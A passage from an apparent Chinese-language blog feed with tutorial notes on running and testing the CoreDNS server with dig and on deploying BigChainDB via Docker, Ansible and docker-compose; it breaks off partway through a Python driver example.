    <updated>2023-02-12T03:09:54.408Z</updated>
    
    <content type="html"><![CDATA[<h2 id="CoreDNS简介"><a href="#CoreDNS简介" class="headerlink" title="CoreDNS简介"></a>CoreDNS简介</h2><ul><li>是一个DNS服务器</li><li>支持插件</li><li>使用Go编写的</li></ul><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><ul><li>预编译的可执行文件<a href="https://github.com/coredns/coredns/releases/tag/v1.10.0">下载地址</a></li><li>Docker <a href="https://hub.docker.com/r/coredns/coredns/">DockerHub-CoreDNS</a></li><li>源代码编译</li></ul><blockquote><p>安装很简单，下载解压可以得到一个<code>coredns</code>可执行文件</p></blockquote><h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><h3 id="启动服务"><a href="#启动服务" class="headerlink" title="启动服务"></a>启动服务</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./coredns -dns.port=1053</span><br></pre></td></tr></table></figure><h3 id="测试服务"><a href="#测试服务" class="headerlink" title="测试服务"></a>测试服务</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dig @localhost -p 1053 a whoami.example.org</span><br></pre></td></tr></table></figure><blockquote><p>以上命令均未报错，且coredns打印出了服务日志</p></blockquote><h2 id="插件"><a href="#插件" class="headerlink" title="插件"></a>插件</h2><p><a href="https://coredns.io/2017/03/01/how-to-add-plugins-to-coredns/">官方插件教程</a></p><p>可以通过实现以下go语言接口，使插件获取dns服务器的请求，进行处理并返回处理结果</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(wh Whoami)</span></span> ServeDNS(ctx context.Context, w dns.ResponseWriter, r *dns.Msg) (<span class="type">int</span>, <span class="type">error</span>)</span><br></pre></td></tr></table></figure><h2 id="补充知识"><a href="#补充知识" class="headerlink" title="补充知识"></a>补充知识</h2><h3 id="dig命令"><a href="#dig命令" class="headerlink" title="dig命令"></a>dig命令</h3><p>dig(domain information group)是常用的域名查询工具，该工具可以从指定DNS服务器查询主机信息</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">; &lt;&lt;&gt;&gt; DiG 9.18.1-1ubuntu1.2-Ubuntu &lt;&lt;&gt;&gt; @localhost -p 1053 a whoami.example.org</span><br><span class="line">; (1 server found)</span><br><span class="line">;; global options: +cmd</span><br><span class="line">;; Got answer:</span><br><span class="line">;; -&gt;&gt;HEADER&lt;&lt;- <span class="string">opcode: QUERY, status: NOERROR, id: 32883</span></span><br><span class="line"><span class="string">;; flags: qr aa rd; QUERY: 1, ANSWER: 0, AUTHORITY: 0, ADDITIONAL: 3</span></span><br><span class="line"><span class="string">;; WARNING: recursion requested but not available</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">;; OPT PSEUDOSECTION:</span></span><br><span class="line"><span class="string">; EDNS: version: 0, flags:; udp: 1232</span></span><br><span class="line"><span class="string">; COOKIE: 83bd45262339483b (echoed)</span></span><br><span class="line"><span class="string">;; QUESTION SECTION:</span></span><br><span class="line"><span class="string">;whoami.example.org.            IN      A</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">;; ADDITIONAL SECTION:</span></span><br><span class="line"><span class="string">whoami.example.org.     0       IN      A       127.0.0.1</span></span><br><span class="line"><span class="string">_udp.whoami.example.org. 0      IN      SRV     0 0 41003 .</span></span><br></pre></td></tr></table></figure><ul><li>dig 的查询时间<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">;; Query time: 0 msec</span><br><span class="line">;; SERVER: 127.0.0.1<span class="comment">#1053(localhost) (UDP)</span></span><br><span class="line">;; WHEN: Sun Jan 01 10:49:45 CST 2023</span><br><span class="line">;; MSG SIZE  rcvd: 135</span><br></pre></td></tr></table></figure></li></ul><h4 id="dig的参数"><a href="#dig的参数" class="headerlink" title="dig的参数"></a>dig的参数</h4><ul><li><p>指定DNS查询记录</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">dig www.baidu.com A     <span class="comment"># 查询A记录，如果域名后面不加任何参数，默认查询A记录</span></span><br><span class="line">dig www.baidu.com MX    <span class="comment"># 查询MX记录</span></span><br><span class="line">dig www.baidu.com CNAME <span class="comment"># 查询CNAME记录</span></span><br><span class="line">dig www.baidu.com NS    <span class="comment"># 查询NS记录</span></span><br><span class="line">dig www.baidu.com ANY   <span class="comment"># 查询上面所有的记录</span></span><br><span class="line"></span><br><span class="line">dig www.baidu.com A +short      <span class="comment"># 查询A记录并显示简要的返回的结果</span></span><br><span class="line">dig www.baidu.com A +multiline  <span class="comment"># 查询A记录并显示详细的返回结果</span></span><br></pre></td></tr></table></figure></li><li><p>指定dns服务器</p></li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dig @DNS_SERVER_IP -p port www.baidu.com</span><br></pre></td></tr></table></figure><ul><li>只打印answer部分<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dig -p 1053 @localhost +noall +answer &lt;name&gt; &lt;<span class="built_in">type</span>&gt;</span><br></pre></td></tr></table></figure></li></ul><p><a href="https://blog.csdn.net/qq_41982020/article/details/121231166">其他信息</a></p><h3 id="DNS记录类型"><a href="#DNS记录类型" class="headerlink" title="DNS记录类型"></a>DNS记录类型</h3><p>DNS记录类型包含：A记录、AAAA记录、CNAME记录、MX记录、NS记录、TXT记录、SRV记录、URL转发。对这些类型的记录解释如下：</p><ul><li><p>A记录<br>将域名指向一个IPv4地址（例如：100.100.100.100），需要增加A记录</p></li><li><p>AAAA记录<br>将域名指向一个IPv6地址（例如：ff03:0:0:0:0:0:0:c1），需要添加AAAA记录</p></li><li><p>CNAME记录<br>将域名指向一个域名，实现与被指向域名相同的访问效果，需要增加CNAME记录。这个域名一般是主机服务商提供的一个域名</p></li><li><p>MX记录<br>将域名指向一个邮件服务器地址，需要设置MX记录。建立邮箱时，一般会根据邮箱服务商提供的MX记录填写此记录</p></li><li><p>NS记录<br>记录是域名服务器记录，用来指定该域名由哪个DNS服务器来进行解析。</p></li><li><p>PTR记录<br>PTR记录是A记录的逆向记录，又称做IP反查记录或指针记录，负责将IP反向解析为域名</p></li><li><p>SRV记录<br>Service Record，用于指定服务器提供服务的位置（如主机名和端口）数据</p></li></ul><h2 id="在windows下访问dns服务器"><a href="#在windows下访问dns服务器" class="headerlink" title="在windows下访问dns服务器"></a>在windows下访问dns服务器</h2><p>在windows中使用dig命令进行试验，如果windows可以正常输出，且dns服务器可以打印相应的日志即可</p><h3 id="Bind9-的安装"><a href="#Bind9-的安装" class="headerlink" title="Bind9 的安装"></a>Bind9 的安装</h3><p>dig命令属于bind工具，官方提供了<a href="ftp://ftp.isc.org/isc/bind9/9.9.9rc1/">ftp</a>服务器用于下载</p><h3 id="使用dig命令"><a href="#使用dig命令" class="headerlink" title="使用dig命令"></a>使用dig命令</h3><p>我使用的是wsl，首先在wsl中使用ifconfig找到wsl的ip地址，并使用下面的命令进行测试</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dig @172.23.208.1 -p 1053 www.baidu.com</span><br></pre></td></tr></table></figure><blockquote><p>观察到命令可以正常返回，dns服务器也打印出了相应的日志</p></blockquote>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;CoreDNS简介&quot;&gt;&lt;a href=&quot;#CoreDNS简介&quot; class=&quot;headerlink&quot; title=&quot;CoreDNS简介&quot;&gt;&lt;/a&gt;CoreDNS简介&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;是一个DNS服务器&lt;/li&gt;
&lt;li&gt;支持插件&lt;/li&gt;
&lt;li&gt;使用Go编写的&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;安装&quot;&gt;&lt;a href=&quot;#安装&quot; class=&quot;headerlink&quot; title=&quot;安装&quot;&gt;&lt;/a&gt;安装&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;预编译的可执行文件&lt;a href=&quot;https://github.com/coredns/coredns/releases/tag/v1.10.0&quot;&gt;下载地址&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Docker &lt;a href=&quot;https://hub.docker.com/r/coredns/coredns/&quot;&gt;DockerHub-CoreDNS&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;源代码编译&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;安装很简单，下载解压可以得到一个&lt;code&gt;coredns&lt;/code&gt;可执行文件&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;测试&quot;&gt;&lt;a href=&quot;#测试&quot; class=&quot;headerlink&quot; title=&quot;测试&quot;&gt;&lt;/a&gt;测试&lt;/h2&gt;</summary>
    
    
    
    <category term="组会" scheme="https://jingtianer.github.io/home/categories/%E7%BB%84%E4%BC%9A/"/>
    
    
    <category term="组会" scheme="https://jingtianer.github.io/home/tags/%E7%BB%84%E4%BC%9A/"/>
    
    <category term="CoreDNS" scheme="https://jingtianer.github.io/home/tags/CoreDNS/"/>
    
  </entry>
  
  <entry>
    <title>BigChain DB的安装与使用</title>
    <link href="https://jingtianer.github.io/home/2022/12/05/%E7%BB%84%E4%BC%9A/bigchainDB/"/>
    <id>https://jingtianer.github.io/home/2022/12/05/%E7%BB%84%E4%BC%9A/bigchainDB/</id>
    <published>2022-12-05T04:15:37.000Z</published>
    <updated>2023-02-12T03:09:54.368Z</updated>
    
    <content type="html"><![CDATA[<h2 id="step1-构建一个BigChainDB节点"><a href="#step1-构建一个BigChainDB节点" class="headerlink" title="step1. 构建一个BigChainDB节点"></a>step1. 构建一个BigChainDB节点</h2><h3 id="使用All-in-One-Docker搭建"><a href="#使用All-in-One-Docker搭建" class="headerlink" title="使用All-in-One Docker搭建"></a>使用All-in-One Docker搭建</h3><ul><li>拉取镜像</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull bigchaindb/bigchaindb:all-in-one</span><br></pre></td></tr></table></figure><ul><li>运行<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">docker run \</span><br><span class="line">  --detach \</span><br><span class="line">  --name bigchaindb \</span><br><span class="line">  --publish 9984:9984 \</span><br><span class="line">  --publish 9985:9985 \</span><br><span class="line">  --publish 27017:27017 \</span><br><span class="line">  --publish 26657:26657 \</span><br><span class="line">  --volume <span class="variable">$HOME</span>/bigchaindb_docker/mongodb/data/db:/data/db \</span><br><span class="line">  --volume <span class="variable">$HOME</span>/bigchaindb_docker/mongodb/data/configdb:/data/configdb \</span><br><span class="line">  --volume <span class="variable">$HOME</span>/bigchaindb_docker/tendermint:/tendermint \</span><br><span class="line">  bigchaindb/bigchaindb:all-in-one</span><br></pre></td></tr></table></figure></li></ul><h3 id="使用Ansible一键脚本搭建"><a href="#使用Ansible一键脚本搭建" class="headerlink" title="使用Ansible一键脚本搭建"></a>使用Ansible一键脚本搭建</h3><h4 id="什么是Ansible-Playbooks"><a href="#什么是Ansible-Playbooks" class="headerlink" title="什么是Ansible Playbooks"></a>什么是Ansible Playbooks</h4><blockquote><p>Ansible Playbooks offer a repeatable, re-usable, simple configuration management and multi-machine deployment system, one that is well suited to deploying complex applications. If you need to execute a task with Ansible more than once, write a playbook and put it under source control. Then you can use the playbook to push out new configuration or confirm the configuration of remote systems. The playbooks in the ansible-examples repository illustrate many useful techniques. You may want to look at these in another tab as you read the documentation.</p></blockquote><ul><li>是一个为了便于多机搭建的工具</li></ul><h4 id="安装Ansible-Playbooks"><a href="#安装Ansible-Playbooks" class="headerlink" title="安装Ansible Playbooks"></a>安装Ansible Playbooks</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m pip install --user ansible</span><br></pre></td></tr></table></figure><h4 id="使用ansible安装BigChainDB"><a href="#使用ansible安装BigChainDB" class="headerlink" title="使用ansible安装BigChainDB"></a>使用ansible安装BigChainDB</h4><ul><li>配置hosts中的all文件，使用basicconfig<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Basic configuration</span></span><br><span class="line"><span class="string">&lt;HOSTNAME&gt;</span>  <span class="string">ansible_ssh_user=tt</span> <span class="string">ansible_sudo_pass=123456</span> <span class="string">voting_power=&lt;INT&gt;</span></span><br></pre></td></tr></table></figure></li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker run -itd -v /root/bigchaindb/bigchaindb-node-ansible:/home/bigchaindb-node-ansible -p 9983:9984  ubuntu /bin/bash</span><br><span class="line">ansible-playbook install.yml -i hosts/all --extra-vars <span class="string">&quot;top_dir=<span class="subst">$(pwd)</span>&quot;</span></span><br><span class="line"><span class="comment"># 或者使用</span></span><br><span class="line">python3 -m ansible playbook install.yml -i hosts/all --extra-vars <span class="string">&quot;top_dir=<span class="subst">$(pwd)</span>&quot;</span></span><br></pre></td></tr></table></figure><ul><li>官网的这个可能用不了，他的原理可能是通过ssh连接进行配置，我们需要后续建立一个ssh</li><li>后续可以自己搭建ansible Control Node达到多机搭建的作用</li></ul><h3 id="不使用docker"><a href="#不使用docker" class="headerlink" title="不使用docker"></a>不使用docker</h3><ul><li><a href="http://docs.bigchaindb.com/en/latest/installation/node-setup/set-up-node-software.html">官方教程</a></li></ul><blockquote><p>以上三种方法任选其一就可以，第三种方法如果需要一个机器对应一个节点时再考虑。</p></blockquote><h2 id="step2-建立网络"><a href="#step2-建立网络" class="headerlink" title="step2. 建立网络"></a>step2. 建立网络</h2><h3 id="编写docker-compose文件"><a href="#编写docker-compose文件" class="headerlink" title="编写docker compose文件"></a>编写docker compose文件</h3><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">&#x27;2.1&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">mongodb:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">mongo:3.6</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;27017:27017&quot;</span></span><br><span class="line">    <span class="attr">command:</span> <span class="string">mongod</span></span><br><span class="line">  <span class="attr">bigchaindb:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">bigchaindb/bigchaindb</span></span><br><span class="line">    <span class="attr">depends_on:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">mongodb</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">tendermint</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="attr">BIGCHAINDB_DATABASE_BACKEND:</span> <span class="string">localmongodb</span></span><br><span class="line">      <span class="attr">BIGCHAINDB_DATABASE_HOST:</span> <span class="string">mongodb</span></span><br><span class="line">      <span class="attr">BIGCHAINDB_DATABASE_PORT:</span> <span class="number">27017</span></span><br><span class="line">      <span class="attr">BIGCHAINDB_SERVER_BIND:</span> <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span><span class="string">:9984</span></span><br><span class="line">      <span class="attr">BIGCHAINDB_WSSERVER_HOST:</span> <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span></span><br><span class="line">      <span class="attr">BIGCHAINDB_WSSERVER_ADVERTISED_HOST:</span> <span class="string">bigchaindb</span></span><br><span class="line">      <span class="attr">BIGCHAINDB_TENDERMINT_HOST:</span> <span class="string">tendermint</span></span><br><span class="line">      <span class="attr">BIGCHAINDB_TENDERMINT_PORT:</span> <span class="number">26657</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;9984:9984&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;9985:9985&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;26658:26658&quot;</span></span><br><span class="line">    <span class="attr">healthcheck:</span></span><br><span class="line">      <span class="attr">test:</span> [<span class="string">&quot;CMD&quot;</span>, <span class="string">&quot;bash&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;curl http://bigchaindb:9984 &amp;&amp; curl http://tendermint:26657/abci_query&quot;</span>]</span><br><span class="line">      <span class="attr">interval:</span> <span class="string">3s</span></span><br><span class="line">      <span class="attr">timeout:</span> <span class="string">5s</span></span><br><span class="line">      <span class="attr">retries:</span> <span class="number">3</span></span><br><span class="line">    <span class="comment">#command: &#x27;bigchaindb start&#x27;</span></span><br><span class="line">  <span class="attr">tendermint:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">tendermint/tendermint:0.22.8</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">./tmdata:/tendermint</span></span><br><span class="line">    <span class="attr">entrypoint:</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;26656:26656&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;26657:26657&quot;</span></span><br><span class="line">    <span class="attr">command:</span> <span class="string">sh</span> <span class="string">-c</span> <span class="string">&quot;tendermint init &amp;&amp; tendermint node --consensus.create_empty_blocks=false --proxy_app=tcp://bigchaindb:26658&quot;</span></span><br></pre></td></tr></table></figure><h3 id="使用tendermint生成配置文件"><a href="#使用tendermint生成配置文件" class="headerlink" title="使用tendermint生成配置文件"></a>使用tendermint生成配置文件</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tendermint testnet</span><br></pre></td></tr></table></figure><ul><li>修改生成的配置文件，写入节点实际ip</li></ul><h3 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><h2 id="step3-测试"><a href="#step3-测试" class="headerlink" title="step3. 测试"></a>step3. 测试</h2><ul><li><p>使用postman发送测试Post交易</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;asset&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;data&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;msg&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Hello BigchainDB!&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;4957744b3ac54434b8270f2c854cc1040228c82ea4e72d66d2887a4d3e30b317&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;inputs&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;fulfillment&quot;</span><span class="punctuation">:</span> <span class="string">&quot;pGSAIDE5i63cn4X8T8N1sZ2mGkJD5lNRnBM4PZgI_zvzbr-cgUCy4BR6gKaYT-tdyAGPPpknIqI4JYQQ-p2nCg3_9BfOI-15vzldhyz-j_LZVpqAlRmbTzKS-Q5gs7ZIFaZCA_UD&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;fulfills&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;owners_before&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="string">&quot;4K9sWUMFwTgaDGPfdynrbxWqWS6sWmKbZoTjxLtVUibD&quot;</span></span><br><span class="line">      <span class="punctuation">]</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;metadata&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;sequence&quot;</span><span class="punctuation">:</span> <span class="number">0</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;operation&quot;</span><span class="punctuation">:</span> <span class="string">&quot;CREATE&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;outputs&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;amount&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;condition&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;details&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;public_key&quot;</span><span class="punctuation">:</span> <span class="string">&quot;4K9sWUMFwTgaDGPfdynrbxWqWS6sWmKbZoTjxLtVUibD&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ed25519-sha-256&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;uri&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ni:///sha-256;PNYwdxaRaNw60N6LDFzOWO97b8tJeragczakL8PrAPc?fpt=ed25519-sha-256&amp;cost=131072&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;public_keys&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="string">&quot;4K9sWUMFwTgaDGPfdynrbxWqWS6sWmKbZoTjxLtVUibD&quot;</span></span><br><span class="line">      <span class="punctuation">]</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2.0&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>查询交易</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost::9984/api/v1/assets/?search=Hello BigchainDB</span><br></pre></td></tr></table></figure></li></ul><h2 id="step4-bigchaindb-driver"><a href="#step4-bigchaindb-driver" class="headerlink" title="step4. bigchaindb_driver"></a>step4. bigchaindb_driver</h2><ul><li>python的api</li></ul><h3 id="安装依赖"><a href="#安装依赖" class="headerlink" title="安装依赖"></a>安装依赖</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pip3 install --upgrade setuptools</span><br><span class="line">sudo apt-get install python3-dev libssl-dev libffi-dev</span><br><span class="line">pip3 install python-rapidjson PyNaCl</span><br></pre></td></tr></table></figure><h3 id="安装driver"><a href="#安装driver" class="headerlink" title="安装driver"></a>安装driver</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install bigchaindb_driver</span><br></pre></td></tr></table></figure><h3 id="运行测试代码"><a href="#运行测试代码" class="headerlink" title="运行测试代码"></a>运行测试代码</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># import BigchainDB and create an object</span></span><br><span class="line"><span class="keyword">from</span> bigchaindb_driver <span class="keyword">import</span> BigchainDB</span><br><span class="line">bdb_root_url = <span class="string">&#x27;https://example.com:9984&#x27;</span></span><br><span class="line">bdb = BigchainDB(bdb_root_url)</span><br><span class="line"></span><br><span class="line"><span class="comment"># generate a keypair</span></span><br><span class="line"><span class="keyword">from</span> bigchaindb_driver.crypto <span class="keyword">import</span> generate_keypair</span><br><span class="line">alice, bob = generate_keypair(), generate_keypair()</span><br><span class="line"></span><br><span class="line"><span class="comment"># create a digital asset for Alice</span></span><br><span class="line">game_boy_token = &#123;</span><br><span class="line">    <span class="string">&#x27;data&#x27;</span>: &#123;</span><br><span class="line">        <span class="string">&#x27;token_for&#x27;</span>: &#123;</span><br><span class="line">            <span class="string">&#x27;game_boy&#x27;</span>: &#123;</span><br><span class="line">                <span class="string">&#x27;serial_number&#x27;</span>: <span class="string">&#x27;LR35902&#x27;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">&#x27;description&#x27;</span>: <span class="string">&#x27;Time share token. Each token equals one hour of usage.&#x27;</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># prepare the transaction with the digital asset and issue 10 tokens for Bob</span></span><br><span class="line">prepared_token_tx = bdb.transactions.prepare(</span><br><span class="line">    operation=<span class="string">&#x27;CREATE&#x27;</span>,</span><br><span class="line">    signers=alice.public_key,</span><br><span class="line">    recipients=[([bob.public_key], <span class="number">10</span>)],</span><br><span class="line">    